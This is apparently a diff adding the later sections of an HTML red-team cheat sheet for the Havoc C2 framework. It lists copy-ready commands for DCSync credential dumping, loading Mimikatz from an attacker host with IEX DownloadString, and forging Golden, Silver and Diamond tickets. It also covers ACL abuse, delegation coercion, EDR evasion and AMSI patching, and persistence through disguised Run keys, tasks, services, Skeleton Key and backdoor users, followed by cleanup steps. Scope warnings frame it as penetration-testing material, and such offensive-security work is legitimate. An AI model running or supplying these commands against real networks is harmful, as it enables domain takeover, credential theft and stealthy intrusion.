+  <!-- ═══════════════ PHASE 6: AD ATTACKS ═══════════════ -->
+  <div class="phase" id="s6">
+    <div class="phase-hdr" style="border-left-color:#e63946;background:linear-gradient(90deg,rgba(230,57,70,.08),var(--surf))">
+      <span class="ph-num">PHASE 06</span>
+      <span class="ph-title" style="color:#e63946">Active Directory Attacks</span>
+      <span class="ph-badge" style="color:#e63946">DOMAIN DOMINANCE</span>
+    </div>
+    <div class="ph-desc">DCSync, Golden/Silver Tickets, Kerberoasting, delegation abuse, ACL exploitation, and forest trust attacks — all executed from an active Demon session.</div>
+
+    <div class="grid">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">6.1</span>
+          <span class="cc-title">DCSync from Demon Session</span>
+          <span class="cc-tags"><span class="tag priv">DA req</span><span class="tag creds">hashes</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">DCSync — replicate all domain hashes</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Via Mimikatz in-memory (Demon)</span>
+powershell IEX(New-Object Net.WebClient).DownloadString('http://<span class="va">LHOST</span>/Invoke-Mimikatz.ps1')
+
+<span class="cm"># Full domain dump</span>
+powershell Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<span class="va">DOMAIN</span> /all /csv"'
+
+<span class="cm"># Target specific user (krbtgt for Golden Ticket)</span>
+powershell Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<span class="va">DOMAIN</span> /user:krbtgt"'
+
+<span class="cm"># DA account</span>
+powershell Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<span class="va">DOMAIN</span> /user:Administrator"'
+
+<span class="cm"># Via SharpKatz (in-memory, no powershell)</span>
+dotnet inline-execute /opt/SharpKatz.exe --Command dcsync --User krbtgt --Domain <span class="va">DOMAIN</span> --DomainController <span class="va">DC_IP</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">6.2</span>
+          <span class="cc-title">Golden &amp; Silver Ticket (Rubeus)</span>
+          <span class="cc-tags"><span class="tag priv">persistence</span><span class="tag lateral">PTT</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Forge and inject tickets via Rubeus</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Golden Ticket (krbtgt hash + domain SID needed)</span>
+dotnet inline-execute /opt/Rubeus.exe golden \
+  /rc4:<span class="va">KRBTGT_HASH</span> \
+  /domain:<span class="va">DOMAIN</span> \
+  /sid:<span class="va">S-1-5-21-XXXX</span> \
+  /user:Administrator \
+  /ptt /nowrap
+
+<span class="cm"># Verify ticket injected:</span>
+shell klist
+
+<span class="cm"># Silver Ticket (machine account hash — no DC needed)</span>
+dotnet inline-execute /opt/Rubeus.exe silver \
+  /service:cifs/<span class="va">TARGET_FQDN</span> \
+  /rc4:<span class="va">MACHINE_HASH</span> \
+  /domain:<span class="va">DOMAIN</span> \
+  /sid:<span class="va">S-1-5-21-XXXX</span> \
+  /user:Administrator \
+  /ptt /nowrap
+
+<span class="cm"># Diamond Ticket (modify real TGT — stealthiest)</span>
+dotnet inline-execute /opt/Rubeus.exe diamond \
+  /tgtdeleg \
+  /ticketuser:Administrator \
+  /ticketuserid:500 \
+  /groups:512 \
+  /krbkey:<span class="va">KRBTGT_HASH</span> \
+  /nowrap</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">6.3</span>
+          <span class="cc-title">ACL Abuse from Demon</span>
+          <span class="cc-tags"><span class="tag priv">privesc</span><span class="tag enum">PowerView</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">ACL exploitation via PowerView in Demon</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Load PowerView first (see 2.4)</span>
+
+<span class="cm"># GenericAll over user → reset password</span>
+powershell Set-DomainUserPassword -Identity <span class="va">targetuser</span> -AccountPassword (ConvertTo-SecureString '<span class="va">NewPass1!</span>' -AsPlainText -Force)
+
+<span class="cm"># GenericAll over group → add to Domain Admins</span>
+powershell Add-DomainGroupMember -Identity 'Domain Admins' -Members '<span class="va">youruser</span>'
+
+<span class="cm"># WriteDACL over domain → grant DCSync</span>
+powershell Add-DomainObjectAcl -TargetIdentity '<span class="va">DOMAIN</span>' -PrincipalIdentity '<span class="va">youruser</span>' -Rights DCSync
+
+<span class="cm"># Verify DA membership</span>
+powershell Get-NetGroupMember -GroupName "Domain Admins"
+
+<span class="cm"># Force GPO update (after GPO-based changes)</span>
+shell gpupdate /force</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">6.4</span>
+          <span class="cc-title">Unconstrained Delegation Abuse</span>
+          <span class="cc-tags"><span class="tag priv">DA path</span><span class="tag creds">TGT capture</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Capture DC TGT from unconstrained delegation host</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># On the delegation host Demon:</span>
+<span class="cm"># Step 1: Start Rubeus monitor for incoming TGTs</span>
+dotnet inline-execute /opt/Rubeus.exe monitor /interval:5 /nowrap
+
+<span class="cm"># Step 2: From attacker — coerce DC to auth to this host</span>
+<span class="cm"># (run from attacker or another Demon):</span>
+shell C:\Tools\SpoolSample.exe <span class="va">DC_FQDN</span> <span class="va">DELEGATION_HOST_FQDN</span>
+<span class="cm"># OR PetitPotam (from impacket on attacker):</span>
+<span class="cm"># python3 PetitPotam.py -u 'user' -p 'pass' DELEGATION_HOST DC_IP</span>
+
+<span class="cm"># Step 3: Rubeus will print DC's TGT — inject it:</span>
+dotnet inline-execute /opt/Rubeus.exe ptt /ticket:<span class="va">BASE64_TGT</span>
+
+<span class="cm"># Step 4: DCSync using DC ticket</span>
+powershell Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<span class="va">DOMAIN</span> /user:krbtgt"'</pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s6 -->
+
+  <!-- ═══════════════ PHASE 7: EVASION & OPSEC ═══════════════ -->
+  <div class="phase" id="s7">
+    <div class="phase-hdr" style="border-left-color:#06d6a0;background:linear-gradient(90deg,rgba(6,214,160,.06),var(--surf))">
+      <span class="ph-num">PHASE 07</span>
+      <span class="ph-title" style="color:#06d6a0">Evasion &amp; OPSEC</span>
+      <span class="ph-badge" style="color:#06d6a0">STEALTH</span>
+    </div>
+    <div class="ph-desc">Stay undetected. Manage your sleep intervals, obfuscate in-memory presence, avoid common EDR hook patterns, and use indirect syscalls.</div>
+
+    <div class="grid single">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">7.1</span>
+          <span class="cc-title">Demon OPSEC Settings</span>
+          <span class="cc-tags"><span class="tag opsec">opsec</span><span class="tag evasion">evasion</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Operational security controls in Demon Console</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Adjust beacon interval (seconds)</span>
+sleep 60         <span class="cm"># 60s sleep — production environments</span>
+sleep 300        <span class="cm"># 5 min — long-term persistence</span>
+sleep 5 30       <span class="cm"># 5s + 30% jitter — faster testing</span>
+
+<span class="cm"># Check current config</span>
+info
+
+<span class="cm"># Change process injection technique</span>
+<span class="cm"># Done at payload generation — options:</span>
+<span class="cm"># NtQueueApcThread / NtCreateThread / NtCreateThreadEx</span>
+
+<span class="cm"># Kill Demon (cleanup)</span>
+exit</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">7.2</span>
+          <span class="cc-title">OPSEC Reference — Do&apos;s &amp; Don&apos;ts</span>
+          <span class="cc-tags"><span class="tag opsec">reference</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="pad">
+          <table class="ref-table">
+            <tr><th>Action</th><th>OPSEC Risk</th><th>Better Alternative</th></tr>
+            <tr><td>Direct lsass.exe read</td><td class="r">CRITICAL</td><td class="g">Nanodump / indirect methods / Volume Shadow</td></tr>
+            <tr><td>Mimikatz.exe on disk</td><td class="r">CRITICAL</td><td class="g">dotnet inline-execute / Invoke-Mimikatz IEX</td></tr>
+            <tr><td>PowerShell -enc command</td><td class="r">HIGH</td><td class="g">Use Demon's powershell module, AMSI patched</td></tr>
+            <tr><td>net user /domain</td><td class="y">MEDIUM</td><td class="g">LDAP queries via Demon module or SharpView</td></tr>
+            <tr><td>5s beacon interval</td><td class="r">HIGH</td><td class="g">30s+ with 20%+ jitter in production</td></tr>
+            <tr><td>HTTP listener (no profile)</td><td class="r">HIGH</td><td class="g">HTTPS + malleable profile + CDN redirector</td></tr>
+            <tr><td>psexec lateral movement</td><td class="r">HIGH</td><td class="g">WMI or token-based lateral move</td></tr>
+            <tr><td>Spawning cmd.exe / powershell.exe</td><td class="y">MEDIUM</td><td class="g">Use Demon shell/powershell built-ins</td></tr>
+            <tr><td>Dropping tools to disk (C:\Temp)</td><td class="y">MEDIUM</td><td class="g">dotnet inline-execute (in-memory execution)</td></tr>
+            <tr><td>Disable Windows Defender via reg</td><td class="r">CRITICAL</td><td class="g">Patch AMSI/ETW in Demon config, don't disable</td></tr>
+          </table>
+          </div>
+          <div class="alert opsec">🛡️&nbsp; Golden rule: prefer <strong>dotnet inline-execute</strong> for .NET tools and <strong>IEX DownloadString</strong> for PowerShell — never drop to disk when you can avoid it.</div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">7.3</span>
+          <span class="cc-title">EDR Detection Awareness</span>
+          <span class="cc-tags"><span class="tag evasion">EDR</span><span class="tag opsec">awareness</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="pad">
+          <table class="ref-table">
+            <tr><th>EDR Product</th><th>Key Detection Mechanisms</th><th>Havoc Mitigations</th></tr>
+            <tr><td class="c">CrowdStrike Falcon</td><td>Kernel sensor, behavioural, memory scanning</td><td class="g">Stack spoof + sleep mask + indirect syscalls</td></tr>
+            <tr><td class="c">SentinelOne</td><td>Story graph, memory introspection</td><td class="g">Process injection into signed procs, long sleep</td></tr>
+            <tr><td class="c">Microsoft Defender</td><td>AMSI, ETW, cloud ML</td><td class="g">Demon patches AMSI+ETW on spawn</td></tr>
+            <tr><td class="c">Carbon Black</td><td>Process tree, fileless detection</td><td class="g">Migrate quickly, avoid suspicious parent proc</td></tr>
+            <tr><td class="c">Elastic/Kibana EDR</td><td>ECS events, rule-based</td><td class="g">Avoid common rule triggers (net, whoami chains)</td></tr>
+          </table>
+          </div>
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Identify EDR product on host</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Quick EDR check</span>
+dotnet inline-execute /opt/Seatbelt.exe AntiVirus
+shell sc query type=all | findstr -i "falcon carbon crowd sentinel cylance"
+shell tasklist | findstr -i "MsMpEng CylanceSvc csfalcon SentinelAgent cbdefense"
+shell reg query "HKLM\SOFTWARE" /s /f "Endpoint" 2>nul | findstr "HKEY"</pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s7 -->
+
+  <!-- ═══════════════ PHASE 8: PERSISTENCE ═══════════════ -->
+  <div class="phase" id="s8">
+    <div class="phase-hdr" style="border-left-color:#ff4d8d;background:linear-gradient(90deg,rgba(255,77,141,.06),var(--surf))">
+      <span class="ph-num">PHASE 08</span>
+      <span class="ph-title" style="color:#ff4d8d">Persistence</span>
+      <span class="ph-badge" style="color:#ff4d8d">MAINTAIN ACCESS</span>
+    </div>
+    <div class="alert danger" style="margin:0 0 16px">⛔&nbsp; Only implement persistence if explicitly in scope. Document all changes. Have a written cleanup plan before executing. Remove all persistence at engagement end.</div>
+
+    <div class="grid">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">8.1</span>
+          <span class="cc-title">Host-Level Persistence</span>
+          <span class="cc-tags"><span class="tag persist">persist</span><span class="tag warn">in-scope only</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Host persistence mechanisms via Demon</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># 1. Registry Run key (user context)</span>
+shell reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\demon.exe" /f
+
+<span class="cm"># 2. Registry Run key (machine — requires admin)</span>
+shell reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinSvc" /t REG_SZ /d "C:\Windows\System32\svchost_update.exe" /f
+
+<span class="cm"># 3. Scheduled task (SYSTEM, survives reboot)</span>
+shell schtasks /create /tn "WindowsTelemetry" /tr "C:\Windows\Temp\demon.exe" /sc ONSTART /ru SYSTEM /f
+
+<span class="cm"># 4. Service creation (SYSTEM context)</span>
+shell sc create WinUpdate binPath= "C:\Windows\Temp\demon.exe" start= auto
+shell sc start WinUpdate
+
+<span class="cm"># 5. Startup folder</span>
+shell copy C:\Windows\Temp\demon.exe "C:\Users\<span class="va">USER</span>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinHelper.exe"
+
+<span class="cm"># 6. WMI event subscription (fileless, hard to detect)</span>
+powershell $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='PersistFilter'; EventNamespace='root\CimV2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
+<span class="cm"># (continue with consumer + binding — see full WMI persistence guide)</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">8.2</span>
+          <span class="cc-title">AD-Level Persistence (via Demon)</span>
+          <span class="cc-tags"><span class="tag persist">AD</span><span class="tag warn">in-scope only</span><span class="tag priv">DA req</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">AD persistence — requires DA, PowerView loaded</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># 1. DCSync rights for backdoor user (stealthy)</span>
+powershell Add-DomainObjectAcl -TargetIdentity '<span class="va">DOMAIN</span>' -PrincipalIdentity '<span class="va">backdooruser</span>' -Rights DCSync
+
+<span class="cm"># 2. AdminSDHolder abuse</span>
+powershell Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<span class="va">corp</span>,DC=<span class="va">local</span>' -PrincipalIdentity '<span class="va">backdooruser</span>' -Rights All
+
+<span class="cm"># 3. Golden Ticket (offline, already covered in 6.2)</span>
+
+<span class="cm"># 4. Skeleton Key (in-memory, lost on reboot)</span>
+powershell Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+<span class="cm"># Test: net use \\DC_IP\c$ /user:anyuser mimikatz</span>
+
+<span class="cm"># 5. SID history injection</span>
+powershell Invoke-Mimikatz -Command '"privilege::debug" "sid::patch" "sid::add /sam:<span class="va">backdooruser</span> /new:<span class="va">DA_SID</span>"'</pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div><!-- /s8 -->
+
+  <!-- ═══════════════ PHASE 9: CLEANUP ═══════════════ -->
+  <div class="phase" id="s9">
+    <div class="phase-hdr" style="border-left-color:#43d97b;background:linear-gradient(90deg,rgba(67,217,123,.06),var(--surf))">
+      <span class="ph-num">PHASE 09</span>
+      <span class="ph-title" style="color:#43d97b">Cleanup &amp; Evidence</span>
+      <span class="ph-badge" style="color:#43d97b">MANDATORY</span>
+    </div>
+    <div class="ph-desc">Remove all artifacts, kill all Demon sessions, revert persistence, and verify clean state. Mandatory at end of every engagement.</div>
+
+    <div class="grid single">
+
+      <div class="cc open">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">9.1</span>
+          <span class="cc-title">Remove All Artifacts</span>
+          <span class="cc-tags"><span class="tag opsec">cleanup</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Cleanup commands from Demon Console</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Remove dropped files</span>
+shell del /f /q C:\Windows\Temp\demon.exe C:\Windows\Temp\*.exe C:\Windows\Temp\*.ps1 C:\Windows\Temp\*.dmp C:\Windows\Temp\*.zip 2>nul
+
+<span class="cm"># Remove scheduled tasks</span>
+shell schtasks /delete /tn "WindowsTelemetry" /f 2>nul
+shell schtasks /delete /tn "WinUpdate" /f 2>nul
+shell schtasks /delete /tn "WindowsUpdate" /f 2>nul
+
+<span class="cm"># Remove services</span>
+shell sc stop WinUpdate 2>nul
+shell sc delete WinUpdate 2>nul
+
+<span class="cm"># Remove registry run keys</span>
+shell reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f 2>nul
+shell reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinSvc" /f 2>nul
+
+<span class="cm"># Remove UAC bypass registry keys</span>
+shell reg delete HKCU\Software\Classes\ms-settings /f 2>nul
+shell reg delete "HKCU\Software\Classes\mscfile" /f 2>nul
+
+<span class="cm"># Remove startup folder items</span>
+shell del /f /q "C:\Users\<span class="va">USER</span>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinHelper.exe" 2>nul
+
+<span class="cm"># Clear downloaded files in temp</span>
+shell del /f /q C:\Windows\Temp\*.hiv C:\Windows\Temp\bh.zip 2>nul
+
+<span class="cm"># Kill Demon session gracefully</span>
+exit</pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="cc">
+        <div class="cc-head" onclick="this.parentElement.classList.toggle('open')">
+          <span class="cc-num">9.2</span>
+          <span class="cc-title">AD Persistence Cleanup (PowerView)</span>
+          <span class="cc-tags"><span class="tag opsec">cleanup</span><span class="tag priv">DA req</span></span>
+          <span class="cc-chev">▼</span>
+        </div>
+        <div class="cc-body">
+          <div class="cb">
+            <div class="cb-label-row"><span class="cb-lbl">Revert all AD changes</span><button class="cpbtn" onclick="cp(this)">COPY</button></div>
+            <pre><span class="cm"># Remove backdoor user</span>
+powershell Remove-DomainUser -Identity backdooruser
+
+<span class="cm"># Revert group membership changes</span>
+powershell Remove-DomainGroupMember -Identity "Domain Admins" -Members "<span class="va">youruser</span>"
+
+<span class="cm"># Remove DCSync rights</span>
+powershell Remove-DomainObjectAcl -TargetIdentity '<span class="va">DOMAIN</span>' -PrincipalIdentity '<span class="va">youruser</span>' -Rights DCSync
+
+<span class="cm"># Remove AdminSDHolder ACE</span>
+powershell Remove-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<span class="va">corp</span>,DC=<span class="va">local</span>' -PrincipalIdentity '<span class="va">backdooruser</span>' -Rights All
+
+<span class="cm"># Invalidate Golden Ticket (change krbtgt password TWICE)</span>
+powershell Set-DomainUserPassword -Identity krbtgt -AccountPassword (ConvertTo-SecureString '<span class="va">NewP@ss1!</span>' -AsPlainText -Force)
+<span class="cm"># Wait 5 min, change again:</span>
+powershell Set-DomainUserPassword -Identity krbtgt -AccountPassword (ConvertTo-SecureString '<span class="va">NewP@ss2!</span>' -AsPlainText -Force)
+
+<span class="cm"># Reboot DC if Skeleton Key was used</span>
+shell shutdown /r /m \\<span class="va">DC_HOSTNAME</span> /t 0 /f /c "Planned maintenance"</pre>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="slabel">ENGAGEMENT CLEANUP CHECKLIST</div>
+    <div class="checklist">
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">All Demon sessions killed (exit)</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">All dropped executables, DLLs, scripts deleted</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">All dump files removed (lsass.dmp, sam.hiv, etc.)</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">All scheduled tasks removed</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">All created services removed</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">All registry Run keys removed</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">UAC bypass registry keys cleaned</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">Created AD user accounts removed</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">Group membership changes reverted</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">ACL modifications removed (DCSync rights, WriteDACL, etc.)</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">AdminSDHolder ACE removed</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">krbtgt password changed x2 (invalidate Golden Tickets)</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">DC rebooted if Skeleton Key was deployed</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">Havoc teamserver stopped + logs archived</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">All screenshots and evidence downloaded from teamserver</span></div>
+      <div class="cli" onclick="this.classList.toggle('chk')"><div class="cli-box">✓</div><span class="cli-text">Attack chain documented for report</span></div>
+    </div>
+
+  </div><!-- /s9 -->
+
+</div><!-- /wrap -->
+
+<button class="scrtop" id="scrtop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+// ── session vars ──
+const SV = {
+  listener:'https', lhost:'LHOST', lport:'443',
+  domain:'DOMAIN', dcip:'DC_IP', priv:'system'
+};
+function sync(){
+  SV.listener = document.getElementById('di_listener').value || 'https';
+  SV.lhost    = document.getElementById('di_lhost').value    || 'LHOST';
+  SV.lport    = document.getElementById('di_lport').value    || '443';
+  SV.domain   = document.getElementById('di_domain').value   || 'DOMAIN';
+  SV.dcip     = document.getElementById('di_dcip').value     || 'DC_IP';
+}
+function setPriv(level, btn){
+  SV.priv = level;
+  document.querySelectorAll('.ptog').forEach(b=>b.classList.remove('on'));
+  btn.classList.add('on');
+}
+
+// ── phase tabs ──
+function show(id, btn){
+  document.querySelectorAll('.phase').forEach(p=>p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  document.querySelectorAll('.ttab').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  btn.style.background = getComputedStyle(document.documentElement).getPropertyValue('--red');
+  // reset other tabs
+  document.querySelectorAll('.ttab:not(.active)').forEach(b=>b.style.background='');
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+// ── copy ──
+function cp(btn){
+  const pre = btn.closest('.cb').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    btn.textContent='COPIED!'; btn.classList.add('ok');
+    setTimeout(()=>{ btn.textContent='COPY'; btn.classList.remove('ok'); }, 1600);
+  });
+}
+
+// ── scroll top ──
+window.addEventListener('scroll',()=>{
+  document.getElementById('scrtop').classList.toggle('show', window.scrollY > 300);
+});
+
+// ── set initial active tab colour ──
+document.querySelector('.ttab.active').style.background = 'var(--red)';
+</script>
+</body>
+</html>
